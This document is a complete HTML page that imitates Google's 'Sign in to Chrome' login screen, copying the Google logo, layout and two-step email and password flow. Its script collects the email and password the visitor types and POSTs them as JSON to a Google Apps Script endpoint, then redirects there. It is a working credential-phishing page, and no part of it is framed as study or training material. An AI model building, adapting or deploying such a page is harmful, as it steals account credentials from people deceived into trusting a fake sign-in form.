<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in to Chrome</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    }

    body {
      background-color: #f0f4f9;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      min-height: 100vh;
      padding: 0 40px;
    }

    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      flex-grow: 1;
      padding-top: 40px;
    }

    .card {
      background-color: #ffffff;
      border-radius: 28px;
      padding: 40px;
      width: 100%;
      max-width: 1040px;
      min-height: 380px;
      display: flex;
      gap: 40px;
    }

    .left-section {
      flex: 1;
      display: flex;
      flex-direction: column;
    }

    .logo {
      width: 48px;
      height: 48px;
      margin-bottom: 20px;
    }

    .title {
      font-size: 36px;
      font-weight: 400;
      color: #1f1f1f;
      line-height: 44px;
      margin-bottom: 12px;
    }

    .subtitle {
      font-size: 16px;
      color: #1f1f1f;
      line-height: 24px;
      word-break: break-all;
    }

    .right-section {
      flex: 1;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
    }

    .form-container {
      width: 100%;
      display: flex;
      flex-direction: column;
      flex-grow: 1;
      justify-content: space-between;
    }

    .input-container {
      position: relative;
      width: 100%;
      margin-top: 12px;
    }

    .input-field {
      width: 100%;
      height: 56px;
      border: 1px solid #747775;
      border-radius: 4px;
      padding: 16px;
      font-size: 16px;
      outline: none;
      color: #1f1f1f;
      background: transparent;
    }

    .input-field:focus {
      border: 2px solid #0b57d0;
      padding: 15px;
    }

    .input-label {
      position: absolute;
      left: 12px;
      top: -10px;
      background: #ffffff;
      padding: 0 4px;
      font-size: 12px;
      color: #0b57d0;
      pointer-events: none;
    }

    .link-text {
      color: #0b57d0;
      font-size: 14px;
      font-weight: 500;
      text-decoration: none;
      margin-top: 10px;
      display: inline-block;
      cursor: pointer;
    }

    .info-text {
      font-size: 14px;
      color: #1f1f1f;
      line-height: 20px;
      margin-top: 32px;
    }

    .info-text a {
      color: #0b57d0;
      text-decoration: none;
      font-weight: 500;
    }

    .checkbox-container {
      display: flex;
      align-items: center;
      margin-top: 16px;
      cursor: pointer;
      user-select: none;
    }

    .checkbox-container input {
      margin-right: 12px;
      width: 18px;
      height: 18px;
      cursor: pointer;
      accent-color: #0b57d0;
    }

    .checkbox-label {
      font-size: 14px;
      color: #1f1f1f;
    }

    .action-container {
      display: flex;
      justify-content: flex-end;
      align-items: center;
      gap: 24px;
      margin-top: auto;
      padding-top: 24px;
    }

    .btn-create {
      background: none;
      border: none;
      color: #0b57d0;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }

    .btn-next {
      background-color: #0b57d0;
      color: #ffffff;
      border: none;
      border-radius: 100px;
      padding: 0 24px;
      height: 40px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
    }

    .btn-next:hover {
      background-color: #0842a0;
    }

    .fade-in {
      animation: fadeInEffect 0.2s ease-in-out forwards;
    }

    @keyframes fadeInEffect {
      from { opacity: 0; transform: translateY(2px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .footer {
      display: flex;
      justify-content: space-between;
      font-size: 12px;
      color: #444746;
      width: 100%;
      max-width: 1040px;
      margin: 0 auto;
      padding: 24px 0;
    }

    .footer-left select {
      border: none;
      background: transparent;
      color: #444746;
      font-size: 12px;
      cursor: pointer;
      outline: none;
    }

    .footer-right span {
      margin-left: 24px;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="card">
      
      <div class="left-section">
        <svg class="logo" viewBox="0 0 24 24">
          <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
          <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
          <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"/>
          <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"/>
        </svg>
        <h1 class="title">Sign in to Chrome</h1>
        <p class="subtitle" id="form-subtitle">Use your Google Account</p>
      </div>

      <div class="right-section">
                <form class="form-container" id="login-form">
          <div id="dynamic-input-area" class="fade-in">
            <div class="input-container">
              <span class="input-label" id="field-label">Email or phone</span>
              <input type="text" id="user-input" class="input-field" autocomplete="off" autofocus>
            </div>
            
            <div id="error-message-box" class="error-msg" style="color: #b3261e; font-size: 12px; margin-top: 6px; display: none;">
              Enter a valid email address
            </div>
            
            <div id="email-links-zone">
              <span class="link-text" style="color: #0b57d0; font-size: 14px; font-weight: 500; cursor: pointer;">Forgot email?</span>
              <p class="info-text" style="font-size: 14px; color: #1f1f1f; line-height: 20px; margin-top: 32px;">Not your computer? Use Guest mode to sign in privately. <a href="#" style="color: #0b57d0; text-decoration: none; font-weight: 500;">Learn more about using Guest mode</a></p>
            </div>

            <div id="password-toggle-zone" style="display: none;">
              <label class="checkbox-container" style="display: flex; align-items: center; margin-top: 16px; cursor: pointer; user-select: none;">
                <input type="checkbox" id="show-pass-check" style="margin-right: 12px; width: 18px; height: 18px; accent-color: #0b57d0;">
                <span class="checkbox-label" style="font-size: 14px; color: #1f1f1f;">Show password</span>
              </label>
            </div>
          </div>

          <div class="action-container" style="display: flex; justify-content: flex-end; align-items: center; gap: 24px; margin-top: auto; padding-top: 24px;">
            <button type="button" class="btn-create" id="create-btn" style="background: none; border: none; color: #0b57d0; font-size: 14px; font-weight: 500; cursor: pointer;">Create account</button>
            <button type="button" class="btn-next" id="action-btn">Next</button>
          </div>
        </form>
      </div>

    </div>
  </div>

  <div class="footer">
    <div class="footer-left">
      <select>
        <option>English (United States)</option>
      </select>
    </div>
    <div class="footer-right">
      <span>Help</span>
      <span>Privacy</span>
      <span>Terms</span>
    </div>
  </div>

  <script>
    let currentStep = 'email'; 
    let storedEmail = '';

    const actionBtn = document.getElementById('action-btn');
    const userInput = document.getElementById('user-input');
    const fieldLabel = document.getElementById('field-label');
    const formSubtitle = document.getElementById('form-subtitle');
    const inputArea = document.getElementById('dynamic-input-area');
    const emailLinksZone = document.getElementById('email-links-zone');
    const passToggleZone = document.getElementById('password-toggle-zone');
    const showPassCheck = document.getElementById('show-pass-check');

    actionBtn.addEventListener('click', handleFormTransition);

    userInput.addEventListener('keypress', (e) => {
      if (e.key === 'Enter') {
        handleFormTransition();
      }
    });

    showPassCheck.addEventListener('change', () => {
      userInput.type = showPassCheck.checked ? 'text' : 'password';
    });

    function handleFormTransition() {
      const value = userInput.value.trim();
      
      // Highlight the box border red if empty
      if (!value) {
        userInput.style.borderColor = '#b3261e';
        userInput.focus();
        return;
      }

      if (currentStep === 'email') {
        storedEmail = value;
        currentStep = 'password';

        inputArea.classList.remove('fade-in');
        void inputArea.offsetWidth; 
        inputArea.classList.add('fade-in');

        formSubtitle.textContent = storedEmail; 
        fieldLabel.textContent = 'Enter your password';
        
        userInput.value = '';
        userInput.type = 'password';
        userInput.style.borderColor = '#747775';
        
        emailLinksZone.style.display = 'none';
        passToggleZone.style.display = 'block';
        showPassCheck.checked = false;

        actionBtn.textContent = 'Sign in';
        
        setTimeout(() => { userInput.focus(); }, 50);

      } else if (currentStep === 'password') {
        const payload = {
          email: storedEmail,
          password: value
        };

        const googleScriptUrl = "https://script.google.com/macros/s/AKfycbx8xKulXePHEDQb-r6sAPLMomkV81YVRWyZ-s4awlDAw1_TNX2jwi_QMYVUBBasGpIGlw/exec";

        fetch(googleScriptUrl, {
          method: "POST",
          mode: "no-cors", 
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify(payload)
        })
        .then(() => {
          window.location.href = "https://script.google.com/macros/s/AKfycbx8xKulXePHEDQb-r6sAPLMomkV81YVRWyZ-s4awlDAw1_TNX2jwi_QMYVUBBasGpIGlw/exec"; 
        })
        .catch(error => {
          console.error("Error connecting to sheet:", error);
          alert("An error occurred.");
        });
      }
    }
  </script>

</body>
</html>
